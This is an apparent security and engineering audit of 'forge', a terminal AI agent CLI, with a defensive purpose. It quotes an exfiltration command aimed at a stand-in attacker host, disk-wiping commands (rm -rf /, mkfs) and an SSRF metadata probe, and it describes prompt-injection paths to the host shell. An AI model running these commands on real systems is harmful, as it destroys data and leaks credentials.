# FORGE — Full Repository Engineering Report (Audit #3)

**Repo:** `hamahasan441-png/forge` · **Branch:** `arena/01a09509-forge` (base `4d235286` = `main` @ PR #88)
**Product:** `forge-agent-cli` **v87.0.0** — standalone terminal AI agent (zero-dependency Node ≥ 18, ESM)
**Date:** 2026-09-12 · **Auditor:** AI engineer pass (independent of reports #1 and #2)
**Method:** every claim below was verified by reading the code *and* executing it (Node v22.22.3, offline). Evidence commands and outputs are quoted. Previous audit findings (F-1…F-10 in `FORGE-AUDIT-REPORT-2.md`) were re-tested, not assumed.

---

## 0. TL;DR — the one-paragraph version

Forge is a **genuinely strong, over-engineered in places, offline-first agent CLI** with an unusually disciplined core: 132/132 test suites pass (including e2e + clean-room install), zero runtime dependencies, no circular imports, crash-safe state machines, and honest code comments. All major security bugs from the previous audit are **verified fixed**. The two real problems are: **(1) the product's own safety perimeter is switched OFF by default** (`tools.unrestricted` + `tools.autoApprove` both default `true` since v85/v87 — `rm -rf /` classifies as `block` but the verdict is `ok:true`), and **(2) repo hygiene is decaying**: one squashed git commit total, four READMEs at three different versions (v21 / v86 / v87), no LICENSE file, 63 of 80 bundled skills without a license, and a 12 MB skill pack (dream interpretation, fortune telling, gaokao) that does not match the "coding agent" positioning. The plan (§7) is small and surgical — nothing needs a rewrite.

---

## 1. Baseline — what I actually ran (evidence)

| Command | Result |
|---|---|
| `FORGE_FAST=1 node tests/run-all.mjs` | **all 129 suite(s) passed** (~86 s) |
| `node tests/run-all.mjs` (full, incl. e2e + cleanroom + cleanroom-pkg) | **all 132 suite(s) passed** (~135 s; e2e 119 s against mock provider on :8787) |
| `node tests/coverage-symbols.mjs` | **828/1007 exported symbols (82.2%) named by a test** across 99 modules |
| `node tests/test-chat-compaction.mjs` × 5 | **5/5 PASS** (the "known flake" did not reproduce) |
| Circular-import graph over all 100 modules | **0 cycles**, 385 internal import edges |
| Hardcoded-secret scan (`sk-…`, `ghp_…`, `AKIA…`) | **clean** |
| `node forge.js --help` | renders 35+ subcommands, exit 0 |
| Working tree | clean; git history = **1 commit total** (see §5.2) |

---

## 2. How it works — architecture map

```
forge/ (npm package, bin: forge → forge.js)
│
├── ENTRY / UX
│   forge.js (1 968 ln)     CLI: 35+ subcommands (chat, ask, agent, tasks, doctor,
│                            provider, skills, bench, claims, decisions, knowledge…)
│   chat.js (2 371 ln)      interactive terminal-in-chat: shell autodetect, /commands,
│                            sessions, compaction, /yolo toggle, failover
│   terminal/uistate/render/markdown/editor/agentview   TUI layer + agent console
│
├── EXECUTION
│   agent.js                ONE bounded tool loop (Task → maxSteps → stop),
│                            batched tools, command_checks, compaction
│   meta.js (1 743 ln)      AUTONOMOUS CONTROLLER (the state machine):
│                            PLAN → DISCOVER → BUILD DAG → SELECT MODEL →
│                            ALLOCATE RESOURCES → EXECUTE SEGMENT → OBSERVE →
│                            CHECKPOINT → VERIFY → CONTINUE
│                            failure → DIAGNOSE → CHANGE STRATEGY → REPAIR → VERIFY
│                            interrupt → RECOVER → RECONCILE → RESUME
│   dag.js (1 064 ln)       pure graph: build/validate/repair/schedule/conflict keys
│   agentmanager.js         worker pool: roles, budgets, cancel protocol, orphan
│                            accounting, reaping; resource-aware (low-RAM clamp)
│   resources.js            adaptive fan-out scaling (RAM/CPU aware)
│
├── INTELLIGENCE ("Ω/∞" layer)
│   omega.js                cognitive-kernel façade over:
│   classify / hypothesis / impact / evidence / diagnose / cmdout /
│   causal / selfdiag / taskmodel / review / telemetry / infogain
│   modelstrategy.js        routes on measured per-model history, not names
│   router.js + capabilities.js + toolintel.js
│                           "which tool, is it safe, parallel?, what evidence"
│
├── TOOLS & SAFETY
│   tools.js (1 837 ln)     19 built-in tools + plugin dispatch + safePath +
│                            read-only policy + redaction choke point
│   shellguard.js (854 ln)  structural command classifier (block/danger/confirm/
│                            low/safe), wrapper unwrapping, $VAR expansion
│   netguard.js             SSRF guard: DNS resolve → validate EVERY address,
│                            IPv4-mapped/CGNAT/link-local/metadata, pinned sockets
│   secrets.js              redaction in every tool result / memory / session note
│   sandbox.js              bwrap isolation; v87: broken-bwrap → unsandboxed re-run
│   checkpoint.js           per-mutation snapshots (gzip), sha256 undo
│
├── KNOWLEDGE
│   memory/lessons/memgraph hierarchical memory + failure learning
│   skills (80 bundled) + skills.js/skilldl.js/skillforge.js/caps.js
│                           skill lifecycle: DOWNLOAD ≠ TRUST — CANDIDATE →
│                            VERIFIED (structural+behavioral) → ACTIVE (gated
│                            promote / autopromote), TTL + drift demotion
│   knowgap/claims/decisions/knowtype/evolve/compose/experiment/empirics/variant
│                            per-project knowledge store + strategy evolution
│
├── PROVIDERS & STATE
│   providers.js (907 ln)   20 providers, OpenAI+Anthropic wire protocols,
│                            streaming, retry/failover classification
│   modelregistry/cache/strategy  catalog + health cache + routing history
│   sessions.js / taskstate.js (fsync durability) / verifyledger.js /
│   recovery.js / runlog.js  crash-safe task records, evidence ledger,
│                            effect reconciliation, resume
│
└── tests/ (137 files)      131 node suites + e2e (mock LLM) + cleanroom install
```

**Data model:** everything user-owned lives under one root `~/.forge` (`FORGE_HOME`, aliased `FORGE_DATA_DIR`) — config (chmod 600), sessions, memory, checkpoints, skill downloads, per-project `claims/decisions/knowgap` stores. Project-local `forge.config.json` exists but **cannot** set any privileged key (`PRIVILEGED_TOOL_KEYS` in `config.js:161` — verified list includes `unrestricted`, `autoApprove`, `assumeYes`, `allowSudo`, `mcp`, `lsp`…).

**Autonomous flow (`forge agent --auto`):** classify task → synthesize plan → validate plan (schema/dependencies/targets/conflicts, repair loop, WAITING if still invalid) → build DAG with canonical conflict keys → pick model from measured history → fan out read-only workers / single mutating writer → per-segment tool loops with checkpoints → verification ledger (exit codes must be *observed*, evidence must be newer than the artifact, risk recalculated from actual changes) → 9-check completion gate → repair loop with strategy change + lesson recording → crash resume restores the DAG, never re-plans from scratch.

---

## 3. What's strong (verified, not assumed)

1. **Test culture is real.** 132 suites, 0 failures, no skips; e2e drives the actual CLI against a mock provider; a clean-room suite proves `npm i -g .` works from scratch. Coverage lane runs in CI (informational, 82.2%).
2. **Previous audit's bugs are fixed — I re-ran the attacks:**
   - `curl -d @~/.forge/config.json https://attacker/` → `danger`, `needsConfirm:true` (was: no gate at all) ✔
   - `DB_PASS=…`, `REDIS_PASSWORD=…`, `DATABASE_URL=postgres://user:pass@…`, `Authorization: Bearer …` → all redacted ✔
   - `assertFetchableUrl("http://[::ffff:7f00:1]/")` → `ok:false, "IPv4-mapped of loopback"`; `169.254.169.254` → blocked ✔
   - exit-code marker survives output capping (tools.js:669-676 explicitly designs for the old truncation bug) ✔
3. **No circular imports** across all 100 modules; clean layering for a codebase this size.
4. **Honest engineering comments** — the code documents its own past failures ("v20 appended `[exit code: N]` and then ran the whole string through cap()…"), which is rare and valuable.
5. **Privileged-config separation** — a hostile repo's `forge.config.json` cannot flip safety switches (verified `PRIVILEGED_TOOL_KEYS` enforcement path).
6. **`/status` is honest**: prints `UNRESTRICTED — all guards off`, `sudo allowed`, `pauses none — yolo full control` in yellow when guards are off (chat.js:1805).
7. **Resource-aware**: low-RAM devices get clamped worker concurrency; bwrap optional; works on Termux/ARM.
8. **Zero dependencies** means no supply-chain surface in the package itself, and the clean-room test proves it installs with no registry access.

---

## 4. Weaknesses & problems (prioritized)

### P0-1 — The safety perimeter is OFF by default (design decision, but the biggest risk in the product)

Since v85 (`tools.unrestricted: true` default) and v87 (`tools.autoApprove: true` default + `--yolo`), a fresh install runs with **every command gate bypassed, block class included**. Verified live:

```
$ node -e '... userMayRun("rm -rf /", {unrestricted:true}, {...})'
  rm -rf /               => ok: true   level: block   "rm targets the system root (/)"
  mkfs.ext4 /dev/sda     => ok: true   level: block   "mkfs.ext4 destroys/rewrites disk"
  curl -d @~/.forge/...  => ok: true   level: danger  "uploads data — needs consent"
  modelMayRun("rm -rf /", {unrestricted:true}) => { ok:true, level:"block", unrestricted:true }
```

The classifier still *labels* correctly — the verdict is `ok:true`. Combined with v87's bwrap fallback (a broken sandbox now re-runs commands **unsandboxed** through `/bin/sh`), the default posture is: **model output → raw host shell, no prompt, no block list.** One prompt-injected web page / tool result is a full command-execution chain. The owner chose this ("this forge belongs to its operator", config.js:95) and it is owner-config-only — but:

- The **documentation contradicts the behavior**: `PACKAGE_INFO.txt` still ships "Catastrophic commands (rm -rf /, mkfs, dd …) **ALWAYS refused**" — that is false on default settings today.
- There is **no first-run banner** telling a new user guards are off.
- Even a "yolo" mode arguably wants an un-overridable floor (e.g. `rm -rf /`, `mkfs`, `dd of=/dev/sd*`, fork bombs) — the code already has the exact `block` class needed to implement one.

### P0-2 — Doc drift is severe and user-facing

Four overlapping docs at three different versions:

| File | Claims | Reality |
|---|---|---|
| `forge/README.md` (the npm README!) | "**v21**" headline, v16–v20 features | package is **v87**; 66 versions behind; never mentions unrestricted/yolo/autoApprove |
| `README.txt` (root) | v21, install path `agentv19/forge` | **path is dead** (folder is `forge/`); version 66 behind |
| `README.md` (root) | v86 | one behind; "Known reds: plugin-iso on Node 22, chat-compact flake" — **both pass here** (132/132 on Node 22; compaction 5/5) |
| `PACKAGE_INFO.txt` | v87 but describes v20 hardening | "Catastrophic commands ALWAYS refused" — **false by default** (see P0-1) |

A new user reading the shipped README learns about a product that stopped existing 66 versions ago.

### P1 — Repo & release hygiene

- **Git history = 1 squashed commit** by `arena-ai-coding-agent[bot]`. The entire v21→v87 story lives only in `CHANGELOG.md` (1 547 lines). No `git bisect`, no per-version diff, no attribution, no review trail. For a project this mature that is a real operational risk.
- **No `LICENSE` file at the repo root** while `package.json` declares MIT and `skills/*/LICENSE.txt` exist for only 17/80 skills.
- **`engines: node >=18` is claimed but CI only tests Node 20 and 22** (`.github/workflows/ci.yml` matrix `[20, 22]`). Node 18 is EOL; either test it or bump the floor.
- Windows is de-facto unsupported (bash e2e, `install.sh`, bwrap/`/bin/sh` assumptions) but `--help` mentions PowerShell — pick a story and document it.
- Root of repo contains the two prior audit reports — fine as history, but there is no `docs/` organization; the root is becoming a junk drawer.

### P2 — Code structure & maintainability

- **Monoliths**: `chat.js` 2 371 lines / 38 imports, `forge.js` 1 968, `tools.js` 1 837, `meta.js` 1 743, `providers.js` 907. All still coherent today (comments are excellent) but they are the files every feature lands in — they will rot first.
- **Test shape**: 68 of 131 test suites are `test-vNN.mjs` — one per *version* rather than per *behavior*. They overlap heavily and will grow unboundedly (v88 suite → v89 suite → …). Consolidation into behavior-named suites would cut runtime and duplication.
- **Module proliferation with overlapping concerns**: `skills.js` vs `skillforge.js` vs `skilldl.js` vs `plugintel.js`; `lang.js` vs `langengine.js` vs `langreason.js` vs `xlang.js`; `verify.js` vs `verifyledger.js`; `evaluate` vs `review` vs `bench` vs `experiment` vs `empirics` vs `infogain`. ~100 top-level files, flat. A `lib/` grouping (ui/, agent/, safety/, knowledge/, providers/) would help navigability without touching the kernel.
- **~60 exports are never referenced outside their own module** (see §5) — a mix of dead code and accidental "API surface". Nobody can tell which is which because there is no documented public API except `runAgent`/`runMeta`.

### P3 — Product & content

- **The 12 MB / 80-skill bundle is unfocused**: `coding-agent`, `forge-git`, `pdf`, `docx`, `xlsx`, `pptx`, `web-search` sit next to `dream-interpreter` (AI dream interpretation with 周公解梦), `get-fortune-analysis`, `anti-pua`, `gaokao-*` (5 skills), `gift-evaluator`, `mindfulness-meditation`, `study-buddy`. These look imported from a consumer app; they inflate every install by megabytes and muddy the "autonomous software engineering system" identity declared in `package.json`.
- **63 of 80 skills ship with no LICENSE.txt** — unclear provenance/redistribution rights for a public MIT package.
- **Hardcoded model catalogs date-stamped "Sep 2026"** (`gpt-5.6-*`, `claude-sonnet-5`, `grok-4.6`, …) — will drift by design; mitigated by live `/models` discovery and v86 `forge provider add`, but the curated defaults will silently age.
- **CHANGELOG ships in the npm package** (127 KB and growing) — harmless, but consider trimming to a window + tags.

---

## 5. "Not wired" — exists but disconnected or unreachable

Things that are real code but effectively dead, stale, or unreachable:

1. **Dead path in shipped docs**: `README.txt` install line `cd agentv19/forge && bash install.sh` — the folder `agentv19/` does not exist.
2. **Stale "known reds"**: root `README.md` + `forge/TODO.md` list `plugin-iso on Node 22` and `chat-compact flake` as failing — both pass in this environment (full suite on Node 22.22.3; compaction 5/5). Either environment-specific or fixed and unrecorded.
3. **~60 never-imported exports** (name never appears outside the defining file — includes `forge.js` and all tests): `dag.updateDAG`, `dag.dagStats`, `dag.markCancelled`, `dag.recomputeDownstream`, `taskstate.blankTask/taskFile/pruneTasks`, `runlog.runFile`, `textdiff.diffLines`, `markdown.renderInline`, `strategy.formatStrategy`, `integrate.formatIntegrate`, `lang.isTestFile/extractExports/extractCalls/extractTypes`, `render.*` (12 functions), `ui.useColor/makeTheme`, `editor.encodeHistoryLine`, `memgraph.entryAsOf`, `onboard.runOnboarding` is wired (CLI) but e.g. `securefs.fdPath/openRoot/secureOpenRead`, `zipingest.crc32/listZipEntries`, `xlang.normName/resolveImport`, `agentview.plainSink` are not. Most are probably internal-use or future API — but nothing marks them as such, so they read as dead code.
4. **The Ω/∞ research console is mostly unreachable by users**: `forge roles`, `forge bench`, `forge experiment`, `forge empirics`, `forge variant`, `forge knowtype`, `forge claims/decisions/knowledge` form a deep sub-command tree exercised mainly by tests. `causal.counterfactuals`, `review.adversarialReview`, `infogain` only fire inside `meta`/`bench` paths. This is "wired" technically, but product-wise it's a basement: no onboarding, no docs, no discoverability — the CHANGELOG is the only map.
5. **`plugin-host.js`** — the isolation host is deliberately not spawned by learned plugins anymore (v43/v48 design: "learned plugins are playbooks, never a live plugin-host spawn"). It remains reachable only via `extend.js` (`HOST_FILE`) for project-local authored plugins. Intentional, but it means a large module is one code-path away from dead.
6. **`TODO.md`** carries `L6 kernel evolution (not now)` and `Strategy 3.0` — acknowledged unwired by design; fine, but it's been parked across ~30 versions.
7. **`telemetry.js`** — local metrics only (no network); not surfaced anywhere a user would see it (`forge doctor` doesn't show it). Harmless, effectively invisible.

*(Checked and NOT a problem: `caps.js`, `agentview.js`, `plugin-host.js`, `runOnboarding`, `empiricPath`/`formatEmpiric`, `detectInterrupted` — all reachable from `forge.js`/`chat.js`/bash e2e. My first pass flagged these only because the CLI entry file was excluded from the scan.)*

---

## 6. Previous audits — fix verification (F-1…F-10 spot re-test)

| Prior finding | Status today | Evidence |
|---|---|---|
| F-1/F-2 shellguard egress/persistence "safe" | **Fixed in classifier** (curl `-d @file` → danger+confirm; `> ~/.bashrc` → danger) — but see P0-1: `unrestricted` default bypasses the verdict | live run §4 |
| F-4 project config flips safety keys | **Fixed** — `PRIVILEGED_TOOL_KEYS` drops them from project config | config.js:161,177 |
| F-5 redaction misses `DB_PASS`/URL passwords | **Fixed** — all 4 sample shapes redacted | live run §3.2 |
| F-6 SSRF IPv4-mapped hex loopback | **Fixed** — `[::ffff:7f00:1]` and `169.254.169.254` rejected with reason | live run §3.2 |
| F-7 exit code truncated to `passed:true` | **Fixed by design** — marker survives cap (tools.js:669+) | code + suite `v80` |
| F-8 plugin/MCP env key inheritance, F-9 context compressor, F-10 silent checkpoint failure | Addressed per CHANGELOG v20.1/v21 line items; suites green; not re-attacked in this pass | — |

The pattern: **audit #2's security perimeter findings were fixed, then v85/v87 switched the perimeter off by default.** The engine is better than ever; the default configuration defeats it.

---

## 7. The plan — prioritized, surgical, no rewrite

### P0 — make the default posture honest (1–2 days)
1. **Documentation truth pass** (highest value/hour in the whole repo):
   - Regenerate `forge/README.md` (the npm README) from the current CLI (`--help` is already 90% of it). Kill the v21 headline.
   - Delete `README.txt` (dead path) or regenerate; sync root `README.md` to v87; rewrite `PACKAGE_INFO.txt`'s "ALWAYS refused" claims to describe v85/v87 defaults accurately.
   - Remove/refresh stale "known reds" notes (verify on a clean CI runner first).
2. **First-run banner when guards are off**: one line on `forge` start — `⚠ UNRESTRICTED: all command guards OFF (tools.unrestricted=false to restore)`. `/status` already does this; the startup doesn't.
3. **Add a `block`-class floor even in unrestricted mode** (optional but recommended): a tiny always-refused list (`rm -rf /`, `mkfs*`, `dd of=/dev/*`, fork bombs) OR an explicit `FORGE_I_ACCEPT_DESTROYING_MY_MACHINE=1` env to override it. The classifier already produces the exact label needed — this is a ~10-line change in the `userMayRun`/`modelMayRun` unrestricted short-circuit, plus a suite.

### P1 — repo hygiene (1 day)
4. **Add `LICENSE` (MIT) at root**; add `LICENSE.txt` or a provenance line to the 63 unlicensed skills (or drop them — see #9).
5. **Decide Node floor**: add Node 18 to the CI matrix or bump `engines` to `>=20` (Node 18 is EOL; recommend `>=20` and matrix `[20, 22, 24]`).
6. **Commit discipline going forward**: stop squashing — one commit per version/feature on `main`. History starts today; the CHANGELOG covers the past.
7. **Windows/macOS**: either explicitly document "Linux/Termux (bash required)" in README/engines.os, or open a tracking issue. Silence is the worst option.

### P2 — code structure (spread over versions, no urgency)
8. **Consolidate the 68 `test-vNN.mjs` suites** into behavior-named suites (`test-skill-lifecycle`, `test-provider-failover`, …). Keep a `test-regressions.mjs` for one-off historical cases. Target: suite count roughly halved, same assertions.
9. **Split the skill pack**: core dev skills (~25) bundled; consumer skills (dream-interpreter, gaokao-*, fortune, …) move to an optional downloadable pack (`forge skill download` already exists). Cuts the npm package from ~16 MB toward ~4 MB and sharpens the product identity.
10. **Mark or prune the ~60 unimported exports**: an `// @public`/`@internal` convention or a single `docs/API.md` listing the real public surface (`runAgent`, `runMeta`, `classifyCommand`, `redact`, `assertFetchableUrl`, `pinnedFetch`, …).
11. **Group the flat 100-file layout** into `ui/ agent/ safety/ knowledge/ providers/ state/` (pure moves, no logic change — `files` array in package.json updated accordingly). Do it in a quiet version; it breaks nothing but makes the repo legible.
12. **Chip at the monoliths opportunistically**: `chat.js` terminal-mode and `/commands` are natural extractions; `forge.js` wizards → `onboard.js` where they already half-live.

### P3 — product hardening (next 2–3 versions)
13. **Nightly (optional, secret-gated) real-provider smoke test** — one real completion per protocol (`openai`, `anthropic`, one router). Today *everything* provider-side is mocked; a wire-format change upstream ships as a user-facing surprise. The v86 github-models URL death is the cautionary tale.
14. **Model catalog freshness**: move curated model lists to a versioned JSON with a "last-verified" date and a `forge doctor` warning when stale > 90 days.
15. **Surface the research console**: a `forge knowledge --tour` or a README section mapping claims/decisions/gaps/knowtype to a workflow. The Ω layer is the most differentiated part of the product and has zero user-facing documentation.
16. **npm publish readiness**: `files` already correct; add `--provenance` publish, and consider publishing under the current name with the README fixed first (#1) — the README is the store page.

### Explicitly NOT recommended (would hurt)
- No framework, no TypeScript migration, no bundler — zero-dependency pure-Node is the product's identity and its supply-chain moat.
- No kernel rewrite / second data root / auto-ACTIVE skills — the standing rules in `TODO.md` are correct; keep them.
- Don't "fix" the flat-file layout or monoliths in one big-bang refactor — the codebase is green and coherent; evolution only.

---

## 8. Scorecard

| Dimension | Score | Note |
|---|---|---|
| Correctness & testing | **9/10** | 132/132 green, e2e + cleanroom, crash matrices; only gap: all provider I/O mocked |
| Architecture | **8/10** | clean layering, 0 import cycles; monoliths + flat layout are the tax |
| Security engineering | **7/10 engine / 3/10 default config** | the machinery is excellent; the defaults defeat it |
| Docs | **3/10** | four READMEs, three versions, one dead path, false safety claims |
| Repo hygiene | **4/10** | 1 commit, no LICENSE, 63 unlicensed skills |
| Product focus | **6/10** | brilliant core; 12 MB consumer-skill ballast |
| **Overall** | **7/10** | an unusually serious hobby-scale system one documentation-and-defaults pass away from being genuinely shippable |

---

*Every command quoted above is reproducible from a clean checkout: `cd forge && node tests/run-all.mjs` (full) or `FORGE_FAST=1 node tests/run-all.mjs` (fast).*
